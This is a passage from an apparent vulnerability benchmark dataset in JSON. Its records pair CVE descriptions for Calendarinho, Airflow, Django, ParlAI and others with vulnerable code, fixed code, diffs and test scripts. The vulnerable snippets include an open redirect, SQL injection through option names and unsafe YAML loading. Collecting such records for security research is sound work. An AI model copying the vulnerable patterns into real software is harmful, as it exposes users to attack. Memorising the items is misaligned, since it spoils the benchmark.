r'(?<!\\\\)<!--(?!>|->)(?:(?!--)[\\s\\S])+?(?<!-)-->|'  # comment\n        r'(?<!\\\\)<\\?[\\s\\S]+?\\?>|'\n        r'(?<!\\\\)<![A-Z][\\s\\S]+?>|'  # doctype\n        r'(?<!\\\\)<!\\[CDATA[\\s\\S]+?\\]\\]>'  # cdata\n    )\n\n    RULE_NAMES = (\n        'escape', 'inline_html', 'auto_link',\n        'std_link', 'ref_link', 'ref_link2',\n        'asterisk_emphasis', 'underscore_emphasis',\n        'codespan', 'linebreak',\n    )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_416_1",
        "commit": "a6d43215132fe4f3d93f8d7e90ba83b16a0838b2",
        "file_path": "mistune/inline_parser.py",
        "start_line": 15,
        "end_line": 100,
        "snippet": "class InlineParser(ScannerParser):\n    ESCAPE = ESCAPE_TEXT\n\n    #: link or email syntax::\n    #:\n    #: <https://example.com>\n    AUTO_LINK = (\n        r'(?<!\\\\)(?:\\\\\\\\)*<([A-Za-z][A-Za-z0-9+.-]{1,31}:'\n        r\"[^ <>]*?|[A-Za-z0-9.!#$%&'*+/=?^_`{|}~-]+@[A-Za-z0-9]\"\n        r'(?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?'\n        r'(?:\\.[A-Za-z0-9](?:[A-Za-z0-9-]{0,61}[A-Za-z0-9])?)*)>'\n    )\n\n    #: link or image syntax::\n    #:\n    #: [text](/link \"title\")\n    #: ![alt](/src \"title\")\n    STD_LINK = (\n        r'!?\\[(' + LINK_TEXT + r')\\]\\(\\s*'\n\n        r'(<(?:\\\\[<>]?|[^\\s<>\\\\])*>|'\n        r'(?:\\\\[()]?|\\([^\\s\\x00-\\x1f\\\\]*\\)|[^\\s\\x00-\\x1f()\\\\])*?)'\n\n        r'(?:\\s+('\n        r'''\"(?:\\\\\"?|[^\"\\\\])*\"|'(?:\\\\'?|[^'\\\\])*'|\\((?:\\\\\\)?|[^)\\\\])*\\)'''\n        r'))?\\s*\\)'\n    )\n\n    #: Get link from references. References are defined in DEF_LINK in blocks.\n    #: The syntax looks like::\n    #:\n    #:    [an example][id]\n    #:\n    #:    [id]: https://example.com \"optional title\"\n    REF_LINK = (\n        r'!?\\[(' + LINK_TEXT + r')\\]'\n        r'\\[(' + LINK_LABEL + r')\\]'\n    )\n\n    #: Simple form of reference link::\n    #:\n    #:    [an example]\n    #:\n    #:    [an example]: https://example.com \"optional title\"\n    REF_LINK2 = r'!?\\[(' + LINK_LABEL + r')\\]'\n\n    #: emphasis and strong * or _::\n    #:\n    #:    *emphasis*  **strong**\n    #:    _emphasis_  __strong__\n    ASTERISK_EMPHASIS = (\n        r'(\\*{1,2})(?=[^\\s*])('\n        r'(?:(?:(?<!\\\\)(?:\\\\\\\\)*\\*)|[^*])+'\n        r')(?<!\\\\)\\1'\n    )\n    UNDERSCORE_EMPHASIS = (\n        r'\\b(_{1,2})(?=[^\\s_])([\\s\\S]*?'\n        r'(?:' + ESCAPE_TEXT + r'|[^\\s_]))\\1'\n        r'(?!_|[^\\s' + PUNCTUATION + r'])\\b'\n    )\n\n    #: codespan with `::\n    #:\n    #:    `code`\n    CODESPAN = (\n        r'(?<!\\\\|`)(?:\\\\\\\\)*(`+)(?!`)([\\s\\S]+?)(?<!`)\\1(?!`)'\n    )\n\n    #: linebreak leaves two spaces at the end of line\n    LINEBREAK = r'(?:\\\\| {2,})\\n(?!\\s*$)'\n\n    INLINE_HTML = (\n        r'(?<!\\\\)<' + HTML_TAGNAME + HTML_ATTRIBUTES + r'\\s*/?>|'  # open tag\n        r'(?<!\\\\)</' + HTML_TAGNAME + r'\\s*>|'  # close tag\n        r'(?<!\\\\)<!--(?!>|->)(?:(?!--)[\\s\\S])+?(?<!-)-->|'  # comment\n        r'(?<!\\\\)<\\?[\\s\\S]+?\\?>|'\n        r'(?<!\\\\)<![A-Z][\\s\\S]+?>|'  # doctype\n        r'(?<!\\\\)<!\\[CDATA[\\s\\S]+?\\]\\]>'  # cdata\n    )\n\n    RULE_NAMES = (\n        'escape', 'inline_html', 'auto_link',\n        'std_link', 'ref_link', 'ref_link2',\n        'asterisk_emphasis', 'underscore_emphasis',\n        'codespan', 'linebreak',\n    )"
      }
    ],
    "vul_patch": "--- a/mistune/inline_parser.py\n+++ b/mistune/inline_parser.py\n@@ -50,8 +50,8 @@\n     #:    _emphasis_  __strong__\n     ASTERISK_EMPHASIS = (\n         r'(\\*{1,2})(?=[^\\s*])('\n-        r'(?:\\\\[\\\\*]|[^*])*'\n-        r'(?:' + ESCAPE_TEXT + r'|[^\\s*]))\\1'\n+        r'(?:(?:(?<!\\\\)(?:\\\\\\\\)*\\*)|[^*])+'\n+        r')(?<!\\\\)\\1'\n     )\n     UNDERSCORE_EMPHASIS = (\n         r'\\b(_{1,2})(?=[^\\s_])([\\s\\S]*?'\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-49281",
    "cve_description": "Calendarinho is an open source calendaring application to manage large teams of consultants. An Open Redirect issue occurs when a web application redirects users to external URLs without proper validation. This can lead to phishing attacks, where users are tricked into visiting malicious sites, potentially leading to information theft and reputational damage to the website used for redirection. The problem is has been patched in commit `15b2393`. Users are advised to update to a commit after `15b2393`. There are no known workarounds for this vulnerability. ",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/Cainor/Calendarinho",
    "patch_url": [
      "https://github.com/Cainor/Calendarinho/commit/9a0174bef939565a76cbe7762996ecddca9ba55e"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_117_1",
        "commit": "9ce3456",
        "file_path": "CalendarinhoApp/authentication.py",
        "start_line": 24,
        "end_line": 48,
        "snippet": "def loginForm(request, next=''):\n    # if this is a POST request we need to process the form data\n    if request.method == 'POST':\n        # create a form instance and populate it with data from the request:\n        form = Login_Form(request.POST)\n        # check whether it's valid:\n        if form.is_valid():\n            username = request.POST.get('username')\n            password = request.POST.get('password')\n            user = user = authenticate(username=username, password=password)\n            if user and user.is_active:\n                login(request, user)\n                if 'next' in request.POST:\n                    return HttpResponseRedirect(request.POST.get('next'))\n                else:\n                    return HttpResponseRedirect(reverse('CalendarinhoApp:Dashboard'))\n            else:\n                messages.error(request, \"Invalid login details given\")\n                form = Login_Form()\n                return render(request, 'CalendarinhoApp/login.html', {'form': form})\n\n    # if a GET (or any other method) we'll create a blank form\n    else:\n        form = Login_Form()\n        return render(request, 'CalendarinhoApp/login.html', {'form': form})"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_117_1",
        "commit": "9a0174b",
        "file_path": "CalendarinhoApp/authentication.py",
        "start_line": 24,
        "end_line": 49,
        "snippet": "def loginForm(request, next=''):\n    # if this is a POST request we need to process the form data\n    if request.method == 'POST':\n        # create a form instance and populate it with data from the request:\n        form = Login_Form(request.POST)\n        # check whether it's valid:\n        if form.is_valid():\n            username = request.POST.get('username')\n            password = request.POST.get('password')\n            user = user = authenticate(username=username, password=password)\n            if user and user.is_active:\n                login(request, user)\n                next_url = request.POST.get('next', '')\n                if next_url and next_url.startswith('/'):\n                    return HttpResponseRedirect(next_url)\n                else:\n                    return HttpResponseRedirect(reverse('CalendarinhoApp:Dashboard'))\n            else:\n                messages.error(request, \"Invalid login details given\")\n                form = Login_Form()\n                return render(request, 'CalendarinhoApp/login.html', {'form': form})\n\n    # if a GET (or any other method) we'll create a blank form\n    else:\n        form = Login_Form()\n        return render(request, 'CalendarinhoApp/login.html', {'form': form})"
      }
    ],
    "vul_patch": "--- a/CalendarinhoApp/authentication.py\n+++ b/CalendarinhoApp/authentication.py\n@@ -10,8 +10,9 @@\n             user = user = authenticate(username=username, password=password)\n             if user and user.is_active:\n                 login(request, user)\n-                if 'next' in request.POST:\n-                    return HttpResponseRedirect(request.POST.get('next'))\n+                next_url = request.POST.get('next', '')\n+                if next_url and next_url.startswith('/'):\n+                    return HttpResponseRedirect(next_url)\n                 else:\n                     return HttpResponseRedirect(reverse('CalendarinhoApp:Dashboard'))\n             else:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-41672",
    "cve_description": "In Apache Airflow, prior to version 2.4.1, deactivating a user wouldn't prevent an already authenticated user from being able to continue using the UI or API.",
    "cwe_info": {
      "CWE-285": {
        "name": "Improper Authorization",
        "description": "The product does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action."
      },
      "CWE-250": {
        "name": "Execution with Unnecessary Privileges",
        "description": "The product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses."
      },
      "CWE-269": {
        "name": "Improper Privilege Management",
        "description": "The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor."
      }
    },
    "repo": "https://github.com/apache/airflow",
    "patch_url": [
      "https://github.com/apache/airflow/commit/12bfb571a895a28a58d3189b0fc10cfc1b89e24c"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_27_1",
        "commit": "d81b297",
        "file_path": "airflow/www/app.py",
        "start_line": 72,
        "end_line": 155,
        "snippet": "def create_app(config=None, testing=False):\n    \"\"\"Create a new instance of Airflow WWW app\"\"\"\n    flask_app = Flask(__name__)\n    flask_app.secret_key = conf.get('webserver', 'SECRET_KEY')\n\n    flask_app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=settings.get_session_lifetime_config())\n    flask_app.config.from_pyfile(settings.WEBSERVER_CONFIG, silent=True)\n    flask_app.config['APP_NAME'] = conf.get(section=\"webserver\", key=\"instance_name\", fallback=\"Airflow\")\n    flask_app.config['TESTING'] = testing\n    flask_app.config['SQLALCHEMY_DATABASE_URI'] = conf.get('database', 'SQL_ALCHEMY_CONN')\n\n    url = make_url(flask_app.config['SQLALCHEMY_DATABASE_URI'])\n    if url.drivername == 'sqlite' and url.database and not url.database.startswith('/'):\n        raise AirflowConfigException(\n            f'Cannot use relative path: `{conf.get(\"database\", \"SQL_ALCHEMY_CONN\")}` to connect to sqlite. '\n            'Please use absolute path such as `sqlite:////tmp/airflow.db`.'\n        )\n\n    flask_app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False\n\n    flask_app.config['SESSION_COOKIE_HTTPONLY'] = True\n    flask_app.config['SESSION_COOKIE_SECURE'] = conf.getboolean('webserver', 'COOKIE_SECURE')\n\n    cookie_samesite_config = conf.get('webserver', 'COOKIE_SAMESITE')\n    if cookie_samesite_config == \"\":\n        warnings.warn(\n            \"Old deprecated value found for `cookie_samesite` option in `[webserver]` section. \"\n            \"Using `Lax` instead. Change the value to `Lax` in airflow.cfg to remove this warning.\",\n            RemovedInAirflow3Warning,\n        )\n        cookie_samesite_config = \"Lax\"\n    flask_app.config['SESSION_COOKIE_SAMESITE'] = cookie_samesite_config\n\n    if config:\n        flask_app.config.from_mapping(config)\n\n    if 'SQLALCHEMY_ENGINE_OPTIONS' not in flask_app.config:\n        flask_app.config['SQLALCHEMY_ENGINE_OPTIONS'] = settings.prepare_engine_args()\n\n    # Configure the JSON encoder used by `|tojson` filter from Flask\n    flask_app.json_provider_class = AirflowJsonProvider\n    flask_app.json = AirflowJsonProvider(flask_app)\n\n    csrf.init_app(flask_app)\n\n    init_wsgi_middleware(flask_app)\n\n    db = SQLA()\n    db.session = settings.Session\n    db.init_app(flask_app)\n\n    init_dagbag(flask_app)\n\n    init_api_experimental_auth(flask_app)\n\n    init_robots(flask_app)\n\n    cache_config = {'CACHE_TYPE': 'flask_caching.backends.filesystem', 'CACHE_DIR': gettempdir()}\n    Cache(app=flask_app, config=cache_config)\n\n    init_flash_views(flask_app)\n\n    configure_logging()\n    configure_manifest_files(flask_app)\n\n    import_all_models()\n\n    with flask_app.app_context():\n        init_appbuilder(flask_app)\n\n        init_appbuilder_views(flask_app)\n        init_appbuilder_links(flask_app)\n        init_plugins(flask_app)\n        init_connection_form()\n        init_error_handlers(flask_app)\n        init_api_connexion(flask_app)\n        init_api_experimental(flask_app)\n\n        sync_appbuilder_roles(flask_app)\n\n        init_jinja_globals(flask_app)\n        init_xframe_protection(flask_app)\n        init_airflow_session_interface(flask_app)\n    return flask_app"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_27_1",
        "commit": "12bfb57",
        "file_path": "airflow/www/app.py",
        "start_line": 76,
        "end_line": 160,
        "snippet": "def create_app(config=None, testing=False):\n    \"\"\"Create a new instance of Airflow WWW app\"\"\"\n    flask_app = Flask(__name__)\n    flask_app.secret_key = conf.get('webserver', 'SECRET_KEY')\n\n    flask_app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=settings.get_session_lifetime_config())\n    flask_app.config.from_pyfile(settings.WEBSERVER_CONFIG, silent=True)\n    flask_app.config['APP_NAME'] = conf.get(section=\"webserver\", key=\"instance_name\", fallback=\"Airflow\")\n    flask_app.config['TESTING'] = testing\n    flask_app.config['SQLALCHEMY_DATABASE_URI'] = conf.get('database', 'SQL_ALCHEMY_CONN')\n\n    url = make_url(flask_app.config['SQLALCHEMY_DATABASE_URI'])\n    if url.drivername == 'sqlite' and url.database and not url.database.startswith('/'):\n        raise AirflowConfigException(\n            f'Cannot use relative path: `{conf.get(\"database\", \"SQL_ALCHEMY_CONN\")}` to connect to sqlite. '\n            'Please use absolute path such as `sqlite:////tmp/airflow.db`.'\n        )\n\n    flask_app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False\n\n    flask_app.config['SESSION_COOKIE_HTTPONLY'] = True\n    flask_app.config['SESSION_COOKIE_SECURE'] = conf.getboolean('webserver', 'COOKIE_SECURE')\n\n    cookie_samesite_config = conf.get('webserver', 'COOKIE_SAMESITE')\n    if cookie_samesite_config == \"\":\n        warnings.warn(\n            \"Old deprecated value found for `cookie_samesite` option in `[webserver]` section. \"\n            \"Using `Lax` instead. Change the value to `Lax` in airflow.cfg to remove this warning.\",\n            RemovedInAirflow3Warning,\n        )\n        cookie_samesite_config = \"Lax\"\n    flask_app.config['SESSION_COOKIE_SAMESITE'] = cookie_samesite_config\n\n    if config:\n        flask_app.config.from_mapping(config)\n\n    if 'SQLALCHEMY_ENGINE_OPTIONS' not in flask_app.config:\n        flask_app.config['SQLALCHEMY_ENGINE_OPTIONS'] = settings.prepare_engine_args()\n\n    # Configure the JSON encoder used by `|tojson` filter from Flask\n    flask_app.json_provider_class = AirflowJsonProvider\n    flask_app.json = AirflowJsonProvider(flask_app)\n\n    csrf.init_app(flask_app)\n\n    init_wsgi_middleware(flask_app)\n\n    db = SQLA()\n    db.session = settings.Session\n    db.init_app(flask_app)\n\n    init_dagbag(flask_app)\n\n    init_api_experimental_auth(flask_app)\n\n    init_robots(flask_app)\n\n    cache_config = {'CACHE_TYPE': 'flask_caching.backends.filesystem', 'CACHE_DIR': gettempdir()}\n    Cache(app=flask_app, config=cache_config)\n\n    init_flash_views(flask_app)\n\n    configure_logging()\n    configure_manifest_files(flask_app)\n\n    import_all_models()\n\n    with flask_app.app_context():\n        init_appbuilder(flask_app)\n\n        init_appbuilder_views(flask_app)\n        init_appbuilder_links(flask_app)\n        init_plugins(flask_app)\n        init_connection_form()\n        init_error_handlers(flask_app)\n        init_api_connexion(flask_app)\n        init_api_experimental(flask_app)\n\n        sync_appbuilder_roles(flask_app)\n\n        init_jinja_globals(flask_app)\n        init_xframe_protection(flask_app)\n        init_airflow_session_interface(flask_app)\n        init_check_user_active(flask_app)\n    return flask_app"
      },
      {
        "id": "fix_py_27_2",
        "commit": "12bfb57",
        "file_path": "airflow/www/extensions/init_security.py",
        "start_line": 68,
        "end_line": 73,
        "snippet": "def init_check_user_active(app):\n    @app.before_request\n    def check_user_active():\n        if g.user is not None and not g.user.is_anonymous and not g.user.is_active:\n            logout_user()\n            return redirect(url_for(app.appbuilder.sm.auth_view.endpoint + \".login\"))"
      }
    ],
    "vul_patch": "--- a/airflow/www/app.py\n+++ b/airflow/www/app.py\n@@ -81,4 +81,5 @@\n         init_jinja_globals(flask_app)\n         init_xframe_protection(flask_app)\n         init_airflow_session_interface(flask_app)\n+        init_check_user_active(flask_app)\n     return flask_app\n\n--- /dev/null\n+++ b/airflow/www/app.py\n@@ -0,0 +1,6 @@\n+def init_check_user_active(app):\n+    @app.before_request\n+    def check_user_active():\n+        if g.user is not None and not g.user.is_anonymous and not g.user.is_active:\n+            logout_user()\n+            return redirect(url_for(app.appbuilder.sm.auth_view.endpoint + \".login\"))\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-41672:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/airflow\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2022-41672/bin/python  -m pytest --with-db-init tests/www/views/test_session.py tests/www/views/test_views_base.py -v -k \"test_check_active_user or test_index\"\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-41672:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/airflow\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2022-41672/bin/python  -m pytest --with-db-init tests/www/views/test_session.py tests/www/views/test_views_base.py -v -k \"not test_index\" \n"
  },
  {
    "cve_id": "CVE-2022-28347",
    "cve_description": "A SQL injection issue was discovered in QuerySet.explain() in Django 2.2 before 2.2.28, 3.2 before 3.2.13, and 4.0 before 4.0.4. This occurs by passing a crafted dictionary (with dictionary expansion) as the **options argument, and placing the injection payload in an option name.",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/django/django",
    "patch_url": [
      "https://github.com/django/django/commit/00b0fc50e1738c7174c495464a5ef069408a4402",
      "https://github.com/django/django/commit/29a6c98b4c13af82064f993f0acc6e8fafa4d3f5",
      "https://github.com/django/django/commit/6723a26e59b0b5429a0c5873941e01a2e1bdbb81",
      "https://github.com/django/django/commit/9e19accb6e0a00ba77d5a95a91675bf18877c72d"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_7_1",
        "commit": "8008288",
        "file_path": "django/db/backends/postgresql/operations.py",
        "start_line": 290,
        "end_line": 304,
        "snippet": "    def explain_query_prefix(self, format=None, **options):\n        prefix = super().explain_query_prefix(format)\n        extra = {}\n        if format:\n            extra[\"FORMAT\"] = format\n        if options:\n            extra.update(\n                {\n                    name.upper(): \"true\" if value else \"false\"\n                    for name, value in options.items()\n                }\n            )\n        if extra:\n            prefix += \" (%s)\" % \", \".join(\"%s %s\" % i for i in extra.items())\n        return prefix"
      },
      {
        "id": "vul_py_7_2",
        "commit": "8008288",
        "file_path": "django/db/models/sql/query.py",
        "start_line": 587,
        "end_line": 591,
        "snippet": "    def explain(self, using, format=None, **options):\n        q = self.clone()\n        q.explain_info = ExplainInfo(format, options)\n        compiler = q.get_compiler(using=using)\n        return \"\\n\".join(compiler.explain_query())"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_7_1",
        "commit": "00b0fc5",
        "file_path": "django/db/backends/postgresql/operations.py",
        "start_line": 302,
        "end_line": 319,
        "snippet": "    def explain_query_prefix(self, format=None, **options):\n        extra = {}\n        # Normalize options.\n        if options:\n            options = {\n                name.upper(): \"true\" if value else \"false\"\n                for name, value in options.items()\n            }\n            for valid_option in self.explain_options:\n                value = options.pop(valid_option, None)\n                if value is not None:\n                    extra[valid_option.upper()] = value\n        prefix = super().explain_query_prefix(format, **options)\n        if format:\n            extra[\"FORMAT\"] = format\n        if extra:\n            prefix += \" (%s)\" % \", \".join(\"%s %s\" % i for i in extra.items())\n        return prefix"
      },
      {
        "id": "fix_py_7_2",
        "commit": "00b0fc5",
        "file_path": "django/db/models/sql/query.py",
        "start_line": 591,
        "end_line": 601,
        "snippet": "    def explain(self, using, format=None, **options):\n        q = self.clone()\n        for option_name in options:\n            if (\n                not EXPLAIN_OPTIONS_PATTERN.fullmatch(option_name)\n                or \"--\" in option_name\n            ):\n                raise ValueError(f\"Invalid option name: {option_name!r}.\")\n        q.explain_info = ExplainInfo(format, options)\n        compiler = q.get_compiler(using=using)\n        return \"\\n\".join(compiler.explain_query())"
      },
      {
        "id": "fix_py_7_3",
        "commit": "00b0fc5",
        "file_path": "django/db/models/sql/query.py",
        "start_line": 52,
        "end_line": 55,
        "snippet": "# Inspired from\n# https://www.postgresql.org/docs/current/sql-syntax-lexical.html#SQL-SYNTAX-IDENTIFIERS\nEXPLAIN_OPTIONS_PATTERN = _lazy_re_compile(r\"[\\w\\-]+\")\n"
      },
      {
        "id": "fix_py_7_4",
        "commit": "00b0fc5",
        "file_path": "django/db/backends/postgresql/operations.py",
        "start_line": 11,
        "end_line": 22,
        "snippet": "    explain_options = frozenset(\n        [\n            \"ANALYZE\",\n            \"BUFFERS\",\n            \"COSTS\",\n            \"SETTINGS\",\n            \"SUMMARY\",\n            \"TIMING\",\n            \"VERBOSE\",\n            \"WAL\",\n        ]\n    )"
      }
    ],
    "vul_patch": "--- a/django/db/backends/postgresql/operations.py\n+++ b/django/db/backends/postgresql/operations.py\n@@ -1,15 +1,18 @@\n     def explain_query_prefix(self, format=None, **options):\n-        prefix = super().explain_query_prefix(format)\n         extra = {}\n+        # Normalize options.\n+        if options:\n+            options = {\n+                name.upper(): \"true\" if value else \"false\"\n+                for name, value in options.items()\n+            }\n+            for valid_option in self.explain_options:\n+                value = options.pop(valid_option, None)\n+                if value is not None:\n+                    extra[valid_option.upper()] = value\n+        prefix = super().explain_query_prefix(format, **options)\n         if format:\n             extra[\"FORMAT\"] = format\n-        if options:\n-            extra.update(\n-                {\n-                    name.upper(): \"true\" if value else \"false\"\n-                    for name, value in options.items()\n-                }\n-            )\n         if extra:\n             prefix += \" (%s)\" % \", \".join(\"%s %s\" % i for i in extra.items())\n         return prefix\n\n--- a/django/db/models/sql/query.py\n+++ b/django/db/models/sql/query.py\n@@ -1,5 +1,11 @@\n     def explain(self, using, format=None, **options):\n         q = self.clone()\n+        for option_name in options:\n+            if (\n+                not EXPLAIN_OPTIONS_PATTERN.fullmatch(option_name)\n+                or \"--\" in option_name\n+            ):\n+                raise ValueError(f\"Invalid option name: {option_name!r}.\")\n         q.explain_info = ExplainInfo(format, options)\n         compiler = q.get_compiler(using=using)\n         return \"\\n\".join(compiler.explain_query())\n\n--- /dev/null\n+++ b/django/db/models/sql/query.py\n@@ -0,0 +1,3 @@\n+# Inspired from\n+# https://www.postgresql.org/docs/current/sql-syntax-lexical.html#SQL-SYNTAX-IDENTIFIERS\n+EXPLAIN_OPTIONS_PATTERN = _lazy_re_compile(r\"[\\w\\-]+\")\n\n--- /dev/null\n+++ b/django/db/models/sql/query.py\n@@ -0,0 +1,12 @@\n+    explain_options = frozenset(\n+        [\n+            \"ANALYZE\",\n+            \"BUFFERS\",\n+            \"COSTS\",\n+            \"SETTINGS\",\n+            \"SUMMARY\",\n+            \"TIMING\",\n+            \"VERBOSE\",\n+            \"WAL\",\n+        ]\n+    )\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-28347:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2022-28347/bin/python ./runtests.py queries.test_explain.ExplainTests.test_option_sql_injection queries.test_explain.ExplainTests.test_invalid_option_names\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-28347:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2022-28347/bin/python ./runtests.py queries.test_explain\n"
  },
  {
    "cve_id": "CVE-2021-39207",
    "cve_description": "parlai is a framework for training and evaluating AI models on a variety of openly available dialogue datasets. In affected versions the package is vulnerable to YAML deserialization attack caused by unsafe loading which leads to Arbitary code execution. This security bug is patched by avoiding unsafe loader users should update to version above v1.1.0. If upgrading is not possible then users can change the Loader used to SafeLoader as a workaround. See commit 507d066ef432ea27d3e201da08009872a2f37725 for details.",
    "cwe_info": {
      "CWE-502": {
        "name": "Deserialization of Untrusted Data",
        "description": "The product deserializes untrusted data without sufficiently ensuring that the resulting data will be valid."
      }
    },
    "repo": "https://github.com/facebookresearch/ParlAI",
    "patch_url": [
      "https://github.com/facebookresearch/ParlAI/commit/4374fa2aba383db6526ab36e939eb1cf8ef99879"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_97_1",
        "commit": "15fbf55",
        "file_path": "parlai/crowdsourcing/tasks/model_chat/model_chat_blueprint.py",
        "start_line": "454",
        "end_line": "462",
        "snippet": "    def _get_shared_models(self, args: \"DictConfig\") -> Dict[str, dict]:\n        with open(args.blueprint.model_opt_path) as f:\n            all_model_opts = yaml.load(f.read())\n        active_model_opts = {\n            model: opt\n            for model, opt in all_model_opts.items()\n            if self.conversations_needed[model] > 0\n        }\n        return TurkLikeAgent.get_bot_agents(args=args, model_opts=active_model_opts)"
      },
      {
        "id": "vul_py_97_2",
        "commit": "15fbf55",
        "file_path": "parlai/crowdsourcing/tasks/model_chat/model_chat_blueprint.py",
        "start_line": "558",
        "end_line": "561",
        "snippet": "    def _get_shared_models(self, args: \"DictConfig\") -> Dict[str, dict]:\n        with open(args.blueprint.model_opt_path) as f:\n            model_opts = yaml.load(f.read())\n        return TurkLikeAgent.get_bot_agents(args=args, model_opts=model_opts)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_97_1",
        "commit": "4374fa2",
        "file_path": "parlai/crowdsourcing/tasks/model_chat/model_chat_blueprint.py",
        "start_line": "454",
        "end_line": "462",
        "snippet": "    def _get_shared_models(self, args: \"DictConfig\") -> Dict[str, dict]:\n        with open(args.blueprint.model_opt_path) as f:\n            all_model_opts = yaml.safe_load(f.read())\n        active_model_opts = {\n            model: opt\n            for model, opt in all_model_opts.items()\n            if self.conversations_needed[model] > 0\n        }\n        return TurkLikeAgent.get_bot_agents(args=args, model_opts=active_model_opts)"
      },
      {
        "id": "fix_py_97_2",
        "commit": "4374fa2",
        "file_path": "parlai/crowdsourcing/tasks/model_chat/model_chat_blueprint.py",
        "start_line": "558",
        "end_line": "561",
        "snippet": "    def _get_shared_models(self, args: \"DictConfig\") -> Dict[str, dict]:\n        with open(args.blueprint.model_opt_path) as f:\n            model_opts = yaml.safe_load(f.read())\n        return TurkLikeAgent.get_bot_agents(args=args, model_opts=model_opts)"
      }
    ],
    "vul_patch": "--- a/parlai/crowdsourcing/tasks/model_chat/model_chat_blueprint.py\n+++ b/parlai/crowdsourcing/tasks/model_chat/model_chat_blueprint.py\n@@ -1,6 +1,6 @@\n     def _get_shared_models(self, args: \"DictConfig\") -> Dict[str, dict]:\n         with open(args.blueprint.model_opt_path) as f:\n-            all_model_opts = yaml.load(f.read())\n+            all_model_opts = yaml.safe_load(f.read())\n         active_model_opts = {\n             model: opt\n             for model, opt in all_model_opts.items()\n\n--- a/parlai/crowdsourcing/tasks/model_chat/model_chat_blueprint.py\n+++ b/parlai/crowdsourcing/tasks/model_chat/model_chat_blueprint.py\n@@ -1,4 +1,4 @@\n     def _get_shared_models(self, args: \"DictConfig\") -> Dict[str, dict]:\n         with open(args.blueprint.model_opt_path) as f:\n-            model_opts = yaml.load(f.read())\n+            model_opts = yaml.safe_load(f.read())\n         return TurkLikeAgent.get_bot_agents(args=args, model_opts=model_opts)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-0845",
    "cve_description": "Code Injection in GitHub repository pytorchlightning/pytorch-lightning prior to 1.6.0.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/pytorchlightning/pytorch-lightning",
    "patch_url": [
      "https://github.com/pytorchlightning/pytorch-lightning/commit/8b7a12c52e52a06408e9231647839ddb4665e8ae"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_102_1",
        "commit": "91052dc",
        "file_path": "pytorch_lightning/utilities/argparse.py",
        "start_line": "99",
        "end_line": "126",
